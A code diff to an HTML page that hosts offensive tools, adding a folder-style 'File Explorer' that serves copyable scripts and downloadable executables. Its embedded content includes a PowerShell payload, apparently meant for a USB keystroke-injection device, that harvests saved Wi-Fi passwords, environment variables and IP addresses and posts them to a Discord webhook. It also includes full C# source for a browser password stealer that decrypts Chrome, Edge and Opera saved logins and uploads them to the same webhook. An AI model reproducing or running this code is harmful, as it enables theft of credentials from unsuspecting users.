@@ -72,6 +72,7 @@
     /* Scripts Section */
     .scripts {
       text-align: left;
+      margin-bottom: 40px;
     }
     .scripts h2 {
       margin-bottom: 20px;
@@ -112,6 +113,61 @@
       background: rgba(102, 204, 102, 0.2);
       transform: scale(1.05);
     }
+    /* Folder Explorer Styles */
+    #file-explorer {
+      text-align: left;
+      margin-top: 40px;
+    }
+    #file-explorer h2 {
+      font-size: 2em;
+      color: #66cc66;
+      margin-bottom: 20px;
+    }
+    .folder {
+      border: 1px solid #66cc66;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .folder-header {
+      cursor: pointer;
+      font-size: 1.2em;
+    }
+    .folder-contents {
+      margin-left: 20px;
+      display: none;
+    }
+    .folder.open > .folder-contents {
+      display: block;
+    }
+    .file {
+      margin: 5px 0;
+    }
+    .copyable-file, .download-file {
+      border: 1px solid #66cc66;
+      padding: 5px;
+      border-radius: 3px;
+      margin: 5px 0;
+    }
+    .copyable-file textarea {
+      width: 100%;
+      height: 100px;
+      background: #2b2b2b;
+      color: #66cc66;
+      border: none;
+      resize: none;
+    }
+    .copyable-file button, .download-file button {
+      margin-top: 5px;
+      background: transparent;
+      border: 1px solid #66cc66;
+      color: #66cc66;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+    .copyable-file button:hover, .download-file button:hover {
+      background: rgba(102, 204, 102, 0.2);
+    }
   </style>
 </head>
 <body>
@@ -141,7 +197,7 @@
       <div class="script">
         <h3>Wifi Script</h3>
         <textarea id="wifiScript" readonly>$url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit</textarea>
-        <button onclick="copyScript('wifiScript')">Copy Wifi Script</button>
+        <button onclick="copyText(document.getElementById('wifiScript').value)">Copy Wifi Script</button>
       </div>
 
       <!-- Passwords.cs Script -->
@@ -404,8 +460,14 @@ namespace Big_Silly
     }
 }
         </textarea>
-        <button onclick="copyScript('passwordsScript')">Copy Passwords.cs</button>
+        <button onclick="copyText(document.getElementById('passwordsScript').value)">Copy Passwords.cs</button>
       </div>
+    </div>
+
+    <!-- Folder Explorer Section -->
+    <div id="file-explorer">
+      <h2>File Explorer</h2>
+      <!-- Folder structure will be dynamically generated here -->
     </div>
   </div>
 
@@ -518,17 +580,417 @@ namespace Big_Silly
       "retina_detect": true
     });
 
-    // Function to copy script content to clipboard
-    function copyScript(id) {
-      const copyText = document.getElementById(id);
-      copyText.select();
-      copyText.setSelectionRange(0, 99999); // For mobile devices
-      navigator.clipboard.writeText(copyText.value).then(() => {
-        alert("Script copied to clipboard!");
-      }, (err) => {
-        alert("Failed to copy the script.");
+    // Generic copy function
+    function copyText(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Copied to clipboard!");
+      }, () => {
+        alert("Failed to copy.");
       });
     }
+
+    /******** File Explorer Code ********/
+    // Define a sample file system
+    const fileSystem = {
+      name: "root",
+      files: [
+        {
+          name: "Discord Token Login Code.txt",
+          content: "Paste your Discord Token Login Code here..."
+        }
+      ],
+      folders: [
+        {
+          name: "Applications",
+          files: [
+            { name: "Charlottes App.exe", url: "https://bleh-xi.vercel.app/Charlottes%20App.exe" },
+            { name: "Silly.zip", url: "https://bleh-xi.vercel.app/Silly.zip" },
+            { name: "POWER.exe", url: "https://bleh-xi.vercel.app/POWER.exe" }
+          ],
+          folders: []
+        },
+        {
+          name: "Scripts",
+          files: [
+            { 
+              name: "Wifi Script.txt", 
+              content: `$url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";
+dir env: >> stats.txt;
+Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' >> stats.txt;
+(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
+| Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
+| %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;
+$Body=@{ content = "$env:computername Stats from Ducky/Pico"};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
+curl.exe -F "file1=@stats.txt" $url ;
+Remove-Item '.\\stats.txt';
+exit`
+            }
+          ],
+          folders: [
+            {
+              name: "Passwords",
+              files: [
+                { 
+                  name: "Passwords.cs", 
+                  content: `using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+using System.Threading.Tasks;
+using System.Net.Http;
+using Newtonsoft.Json;
+using System.Data.SQLite;
+using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
+using Org.BouncyCastle.Crypto.Engines;
+
+namespace Big_Silly
+{
+    public static class Pass
+    {
+        // Replace with your actual Discord webhook URL.
+        private const string WEBHOOK_URL = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";
+
+        /// <summary>
+        /// Reads the Local State file for the given browser and returns the decrypted master key.
+        /// </summary>
+        public static byte[] GetMasterKey(string browser)
+        {
+            string localStatePath = string.Empty;
+            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            switch (browser.ToLower())
+            {
+                case "edge":
+                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Local State");
+                    break;
+                case "chrome":
+                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Local State");
+                    break;
+                case "opera":
+                    localStatePath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Local State");
+                    break;
+                default:
+                    return null;
+            }
+            if (!File.Exists(localStatePath))
+            {
+                // Could log that the browser was not found.
+                return null;
+            }
+            try
+            {
+                string jsonText = File.ReadAllText(localStatePath);
+                dynamic localState = JsonConvert.DeserializeObject(jsonText);
+                string encryptedKeyB64 = localState["os_crypt"]["encrypted_key"];
+                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyB64);
+                // Remove the first 5 bytes (the "DPAPI" prefix)
+                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
+                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
+                // Decrypt the master key using DPAPI
+                byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
+                return masterKey;
+            }
+            catch (Exception)
+            {
+                // Log the error if needed.
+                return null;
+            }
+        }
+
+        /// <summary>
+        /// Decrypts an individual password (stored as a blob) using the given master key.
+        /// </summary>
+        public static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
+        {
+            try
+            {
+                // Validate the length: 3-byte prefix + 12-byte IV + (ciphertext + 16-byte tag) must be present.
+                if (encryptedData == null || encryptedData.Length < (3 + 12 + 16))
+                    return "";
+
+                // Skip the first 3 bytes (prefix)
+                int ivOffset = 3;
+                int ivLength = 12;
+                byte[] iv = new byte[ivLength];
+                Array.Copy(encryptedData, ivOffset, iv, 0, ivLength);
+
+                // Calculate the length of ciphertext (total length minus prefix, IV, and tag)
+                int tagLength = 16;
+                int cipherTextLength = encryptedData.Length - 3 - ivLength - tagLength;
+                if (cipherTextLength <= 0)
+                    return "";
+
+                // Extract ciphertext
+                byte[] cipherText = new byte[cipherTextLength];
+                Array.Copy(encryptedData, ivOffset + ivLength, cipherText, 0, cipherTextLength);
+
+                // Extract tag (last 16 bytes)
+                byte[] tag = new byte[tagLength];
+                Array.Copy(encryptedData, encryptedData.Length - tagLength, tag, 0, tagLength);
+
+                // Combine ciphertext and tag in one array as expected by BouncyCastle.
+                byte[] cipherTextWithTag = new byte[cipherTextLength + tagLength];
+                Array.Copy(cipherText, 0, cipherTextWithTag, 0, cipherTextLength);
+                Array.Copy(tag, 0, cipherTextWithTag, cipherTextLength, tagLength);
+
+                // Set up the cipher using BouncyCastle.
+                // Create an instance of the AES engine in GCM mode.
+                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
+                // 128-bit MAC size is standard for AES-GCM.
+                AeadParameters parameters = new AeadParameters(new KeyParameter(masterKey), 128, iv, null);
+                cipher.Init(false, parameters); // false for decryption
+
+                // Prepare a buffer to hold the decrypted output.
+                byte[] plainText = new byte[cipher.GetOutputSize(cipherTextWithTag.Length)];
+                int len = cipher.ProcessBytes(cipherTextWithTag, 0, cipherTextWithTag.Length, plainText, 0);
+                cipher.DoFinal(plainText, len);
+
+                // Convert the decrypted bytes to a UTF8 string.
+                return Encoding.UTF8.GetString(plainText).TrimEnd('\0');
+            }
+            catch (Exception ex)
+            {
+                // Optionally log the exception message.
+                Console.WriteLine($"Password decryption failed: {ex.Message}");
+                return "Decryption failed";
+            }
+        }
+
+        /// <summary>
+        /// Retrieves login credentials from the browser’s Login Data database.
+        /// </summary>
+        public static Dictionary<string, (string username, string password)> GetPasswords(string browser)
+        {
+            var passwords = new Dictionary<string, (string username, string password)>();
+            byte[] masterKey = GetMasterKey(browser);
+            if (masterKey == null)
+                return passwords;
+
+            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            string loginDataPath = string.Empty;
+            switch (browser.ToLower())
+            {
+                case "edge":
+                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
+                    break;
+                case "chrome":
+                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\Login Data");
+                    break;
+                case "opera":
+                    loginDataPath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Login Data");
+                    break;
+                default:
+                    return passwords;
+            }
+            if (!File.Exists(loginDataPath))
+                return passwords;
+
+            // Copy the locked database to a temporary file.
+            string tempFile = Path.Combine(Path.GetTempPath(), "Loginvault.db");
+            try
+            {
+                File.Copy(loginDataPath, tempFile, true);
+            }
+            catch (Exception)
+            {
+                // Log error copying the file if needed.
+                return passwords;
+            }
+
+            try
+            {
+                using (var connection = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
+                {
+                    connection.Open();
+                    using (var command = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", connection))
+                    using (var reader = command.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
+                            string username = reader.IsDBNull(1) ? "" : reader.GetString(1);
+                            byte[] encryptedPassword = (byte[])reader["password_value"];
+                            string decryptedPassword = DecryptPassword(encryptedPassword, masterKey);
+                            if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(decryptedPassword))
+                            {
+                                passwords[url] = (username, decryptedPassword);
+                            }
+                        }
+                    }
+                    connection.Close();
+                }
+            }
+            catch (Exception)
+            {
+                // Log query error if needed.
+            }
+            try
+            {
+                File.Delete(tempFile);
+            }
+            catch (Exception)
+            {
+                // Log deletion error if needed.
+            }
+            return passwords;
+        }
+
+        /// <summary>
+        /// Sends the collected passwords as a text file to the Discord webhook.
+        /// </summary>
+        public static async Task SendToWebhookAsync(Dictionary<string, (string username, string password)> passwords)
+        {
+            if (passwords == null || passwords.Count == 0)
+            {
+                // Optionally log that no passwords were found.
+                return;
+            }
+            StringBuilder sb = new StringBuilder();
+            foreach (var kvp in passwords)
+            {
+                sb.AppendLine($"URL: {kvp.Key}");
+                sb.AppendLine($"Username: {kvp.Value.username}");
+                sb.AppendLine($"Password: {kvp.Value.password}");
+                sb.AppendLine();
+            }
+            string content = sb.ToString();
+
+            using (var client = new HttpClient())
+            using (var form = new MultipartFormDataContent())
+            {
+                var fileContent = new StringContent(content, Encoding.UTF8, "text/plain");
+                form.Add(fileContent, "file", "passwords.txt");
+
+                HttpResponseMessage response = await client.PostAsync(WEBHOOK_URL, form);
+                // Optionally check the response status.
+            }
+        }
+
+        /// <summary>
+        /// Extracts passwords from Chrome, Edge, and Opera and sends the combined report via webhook.
+        /// </summary>
+        public static async Task ExtractAndSendPasswordsAsync()
+        {
+            var allPasswords = new Dictionary<string, (string username, string password)>();
+            foreach (var browser in new string[] { "chrome", "edge", "opera" })
+            {
+                var browserPasswords = GetPasswords(browser);
+                foreach (var kvp in browserPasswords)
+                {
+                    // If the same URL exists for multiple browsers, the last one will overwrite.
+                    allPasswords[kvp.Key] = kvp.Value;
+                }
+            }
+            await SendToWebhookAsync(allPasswords);
+        }
+    }
+}
+
+                }
+              ],
+              folders: []
+            }
+          ]
+        },
+        {
+          name: "Tools",
+          files: [
+            { name: "Tool.lua", content: "-- Lua tool script here" }
+          ],
+          folders: []
+        }
+      ]
+    };
+
+    // Render a file (returns a DOM element)
+    function renderFile(file) {
+      const fileDiv = document.createElement("div");
+      fileDiv.classList.add("file");
+
+      // Determine if this file is "copyable" or a "download"
+      const lowerName = file.name.toLowerCase();
+      if (file.content) { // copyable file
+        const container = document.createElement("div");
+        container.classList.add("copyable-file");
+        const title = document.createElement("div");
+        title.textContent = "📄 " + file.name;
+        const textarea = document.createElement("textarea");
+        textarea.readOnly = true;
+        textarea.value = file.content;
+        const copyBtn = document.createElement("button");
+        copyBtn.textContent = "Copy " + file.name;
+        copyBtn.onclick = () => copyText(file.content);
+        container.appendChild(title);
+        container.appendChild(textarea);
+        container.appendChild(copyBtn);
+        fileDiv.appendChild(container);
+      } else if (file.url) { // downloadable file
+        const container = document.createElement("div");
+        container.classList.add("download-file");
+        const title = document.createElement("div");
+        title.textContent = "📄 " + file.name;
+        const downloadLink = document.createElement("a");
+        downloadLink.href = file.url;
+        downloadLink.download = file.name;
+        const downloadBtn = document.createElement("button");
+        downloadBtn.textContent = "Download " + file.name;
+        downloadLink.appendChild(downloadBtn);
+        container.appendChild(title);
+        container.appendChild(downloadLink);
+        fileDiv.appendChild(container);
+      }
+      return fileDiv;
+    }
+
+    // Render a folder recursively
+    function renderFolder(folder) {
+      const folderDiv = document.createElement("div");
+      folderDiv.classList.add("folder");
+
+      const header = document.createElement("div");
+      header.classList.add("folder-header");
+      header.textContent = "📁 " + folder.name;
+      // Toggle open/close on click
+      header.onclick = () => {
+        folderDiv.classList.toggle("open");
+      };
+
+      const contents = document.createElement("div");
+      contents.classList.add("folder-contents");
+      // Render files
+      folder.files.forEach(f => {
+        contents.appendChild(renderFile(f));
+      });
+      // Render subfolders recursively
+      folder.folders.forEach(subfolder => {
+        contents.appendChild(renderFolder(subfolder));
+      });
+
+      folderDiv.appendChild(header);
+      folderDiv.appendChild(contents);
+      return folderDiv;
+    }
+
+    // Render the root file system (without a header for "root")
+    function renderFileSystem(fs) {
+      const explorer = document.getElementById("file-explorer");
+      // Render files in root
+      fs.files.forEach(file => {
+        explorer.appendChild(renderFile(file));
+      });
+      // Render folders in root
+      fs.folders.forEach(folder => {
+        explorer.appendChild(renderFolder(folder));
+      });
+    }
+
+    // Initialize the file explorer on page load
+    document.addEventListener("DOMContentLoaded", function() {
+      renderFileSystem(fileSystem);
+    });
   </script>
 </body>
 </html>
